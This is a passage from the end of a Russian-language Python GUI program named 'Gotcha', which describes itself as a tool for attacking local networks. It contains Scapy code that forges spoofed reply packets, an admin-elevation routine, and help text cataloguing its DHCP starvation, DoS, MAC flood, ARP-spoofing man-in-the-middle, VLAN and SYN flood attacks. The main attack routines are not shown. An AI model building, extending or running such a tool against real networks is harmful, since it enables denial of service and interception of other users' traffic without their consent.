                return IP(src=original_packet[IP].dst, dst=original_packet[IP].src)/ICMP(type=0, id=original_packet[ICMP].id, seq=original_packet[ICMP].seq)
            
            elif original_packet.haslayer(TCP):
                return IP(src=original_packet[IP].dst, dst=original_packet[IP].src)/TCP(
                    sport=original_packet[TCP].dport, 
                    dport=original_packet[TCP].sport,
                    flags="RA",
                    seq=random.randint(1000, 9000),
                    ack=original_packet[TCP].seq + 1
                )
            
            elif original_packet.haslayer(UDP):
                return IP(src=original_packet[IP].dst, dst=original_packet[IP].src)/UDP(
                    sport=original_packet[UDP].dport,
                    dport=original_packet[UDP].sport
                )/b"Response"
                
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка создания ответного пакета: {str(e)}\n")
        
        return None

    def setup_settings_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        theme_frame = ttk.LabelFrame(main_frame, text="Настройки темы")
        theme_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Button(theme_frame, text="Светлая тема", 
                  command=lambda: self.theme_manager.apply_theme("light"), width=12).pack(side='left', padx=4, pady=4)
        ttk.Button(theme_frame, text="Темная тема", 
                  command=lambda: self.theme_manager.apply_theme("dark"), width=12).pack(side='left', padx=4, pady=4)
        
        help_frame = ttk.LabelFrame(main_frame, text="Справка и документация")
        help_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(help_frame, text="Открыть полную справку", 
                  command=self.show_help, width=22).pack(padx=8, pady=8)

    def save_log(self, text_widget):
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(text_widget.get(1.0, tk.END))
                self.status_var.set("Логи сохранены")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось сохранить файл: {str(e)}")

    def show_help(self):
        help_window = tk.Toplevel(self.root)
        help_window.title("Справка")
        help_window.geometry("800x700")
        help_window.resizable(True, True)
        help_window.transient(self.root)
        help_window.grab_set()
        
        try:
            help_window.iconbitmap("images.ico")
        except:
            pass
        
        help_notebook = ttk.Notebook(help_window)
        help_notebook.pack(fill='both', expand=True, padx=15, pady=15)
        
        general_frame = ttk.Frame(help_notebook)
        help_notebook.add(general_frame, text="Общая информация")
        
        general_text = """Программа для атаки локальных вычислительных сетей

https://github.com/hedromanie

ТРЕБОВАНИЯ:
• Права Администратора
• OC : Windows 10 21h2+
• NPCAP/WINPCAP
• Для просмотра сетевого трафика рекомендуется WireShark

Для копирования логов напрямую из программы воспользуйтесь CTRL+C ( Находясь в англ. раскладке )
"""
        
        general_text_widget = scrolledtext.ScrolledText(general_frame, wrap=tk.WORD, font=('Arial', 10))
        general_text_widget.pack(fill='both', expand=True, padx=10, pady=10)
        general_text_widget.insert('1.0', general_text)
        general_text_widget.config(state='disabled')
        
        bpf_frame = ttk.Frame(help_notebook)
        help_notebook.add(bpf_frame, text="BPF фильтры")
        
        bpf_text = """Bpf фильтры (Berkeley Packet Filter)

Примечание: Это примеры можно пробовать и другие вариации

ОСНОВНЫЕ ПРИМИТИВЫ:
    host 192.168.1.1     - трафик с/на указанный хост
    net 192.168.0.0/24   - трафик в указанной сети
    port 80              - трафик на порт 80
    portrange 1-1024     - трафик в диапазоне портов

ПРОТОКОЛЫ:
    ip, ip6, arp, tcp, udp, icmp, icmp6

НАПРАВЛЕНИЕ:
    src host 192.168.1.1 - трафик от указанного хоста
    dst host 192.168.1.1 - трафик к указанному хосту
    src port 80          - трафик с порта 80
    dst port 80          - трафик на порт 80

ЛОГИЧЕСКИЕ ОПЕРАТОРЫ:
    and, or, not

ПОПУЛЯРНЫЕ КОМБИНАЦИИ:
    'tcp port 80'                        - HTTP трафик
    'udp port 53'                        - DNS запросы
    'icmp'                               - ICMP пакеты (ping)
    'arp'                                - ARP пакеты
    'not arp'                            - все кроме ARP
    'host 192.168.1.100 and tcp port 80' - HTTP трафик с/на хост
    'src net 192.168.1.0/24'             - трафик из сети 192.168.1.0/24
    'tcp and (port 80 or port 443)'      - HTTP/HTTPS трафик
    'icmp or arp'                        - ICMP и ARP пакеты
    'not port 22 and not port 23'        - исключает SSH и Telnet
    'not (arp or stp or cdp)'            - исключает служебные протоколы"""
        
        bpf_text_widget = scrolledtext.ScrolledText(bpf_frame, wrap=tk.WORD, font=('Consolas', 9))
        bpf_text_widget.pack(fill='both', expand=True, padx=10, pady=10)
        bpf_text_widget.insert('1.0', bpf_text)
        bpf_text_widget.config(state='disabled')

        attacks_frame = ttk.Frame(help_notebook)
        help_notebook.add(attacks_frame, text="Описание атак")
        
        attacks_text = """ОПИСАНИЕ ФУНКЦИЙ И АТАК:

ВСПОМОГАТЕЛЬНЫЕ ИНСТРУМЕНТЫ:
• ICMP Ping - проверка доступности узла
• Port Scan - сканирование распространенных портов
• Traceroute - определение маршрута следования пакетов
• Таблица маршрутизации - просмотр таблицы маршрутизации IPv4/IPv6
• Сетевые адаптеры - просмотр всех сетевых интерфейсов

Таблица маршрутизации - это набор правил, используемых для определения пути,
по которому пакет данных должен быть отправлен через сеть. Каждая запись содержит:
1. Сетевой адрес назначения
2. Маска подсети
3. Шлюз (gateway) - следующий узел на пути к цели
4. Интерфейс - сетевой адаптер для отправки
5. Метрика - стоимость маршрута (чем меньше, тем предпочтительнее)

АТАКИ:
1. ПЕРЕХВАТ ПАКЕТОВ С ОТВЕТАМИ
   - Перехватывает входящие пакеты
   - Отправляет несколько ответных пакетов
   - Настраиваемое количество ответов
   - Возможность захвата и отправки конкретным пакетом
   - Выбор и редактирование пакетов
   - Отправка отредактированного пакета

2. DHCP STARVATION АТАКА
   - Отправка DHCP Discover с уникальными случайными MAC
   - Занимает весь пул IP-адресов на DHCP сервере
   - Предотвращает получение IP легитимными клиентами
   - Настраиваемый размер пула ( В зависимости от маски и прочих условий )
   - Ускоренная отправка пакетов (настраиваемая задержка)

3. DOS АТАКА
   - Поддержка протоколов: TCP, UDP, ICMP, ARP, DNS
   - ( Приоритет UDP,ICMP из-за огромного кол-ва пакетов )

4. MAC FLOOD АТАКА
   - Переполнение таблицы MAC-адресов коммутатора
   - Случайные MAC-адреса
   - Позволяет прослушивать весь сетевой трафик

5. ARP Spoofing
   - Man-in-middle атака через ARP poisoning
   - Обманывает целевые хосты, подменяя MAC адреса
   - Позволяет перехватывать трафик между узлами сети

6. ARP/ICMP flood
   - Массовая отправка ARP или ICMP пакетов с разными IP адресами
   - Поддержка пачечной отправки для увеличения скорости

7. VLAN ID flood
   - Атака на VLAN сети с отправкой кадров с различными VLAN ID
   - Переполнение таблицы VLAN на коммутаторе
   - Возможность указания диапазона VLAN ID

8. SYN-flood
   - Атака на TCP соединения с SYN пакетами
   - Использует случайные исходные IP адреса"""
        
        attacks_text_widget = scrolledtext.ScrolledText(attacks_frame, wrap=tk.WORD, font=('Arial', 10))
        attacks_text_widget.pack(fill='both', expand=True, padx=10, pady=10)
        attacks_text_widget.insert('1.0', attacks_text)
        attacks_text_widget.config(state='disabled')

        close_btn = ttk.Button(help_window, text="Закрыть", command=help_window.destroy)
        close_btn.pack(pady=10)

        self.theme_manager.apply_to_widgets(help_window, 
                                          self.theme_manager.themes[self.theme_manager.current_theme])
    
    def on_closing(self):
        if self.custom_attack_running:
            self.stop_custom_attack()
        if self.dhcp_attack_running:
            self.stop_dhcp_attack()
        if self.mac_flood_running:
            self.stop_mac_flood()
        if self.arp_spoof_running:
            self.stop_arp_spoof()
        if self.packet_intercept_running:
            self.stop_packet_intercept()
        if self.flood_attack_running:
            self.stop_flood_attack()
        if self.vlan_attack_running:
            self.stop_vlan_flood()
        if self.syn_flood_running:
            self.stop_syn_flood()
        
        self.system_monitor_running = False
        self.root.destroy()

def check_admin():
    if platform.system() == "Windows":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    return True

def main():
    # Проверка прав администратора для Windows
    if platform.system() == "Windows" and not check_admin():
        messagebox.showerror("Требуются права администратора", 
                           "Для работы программа должна быть запущена от имени администратора.")
        
        # Попытка перезапуска с правами администратора
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        except:
            pass
        return
    
    root = tk.Tk()
    app = Gotcha(root)
    
    # Обработчик закрытия окна
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    
    root.mainloop()

if __name__ == "__main__":
    main()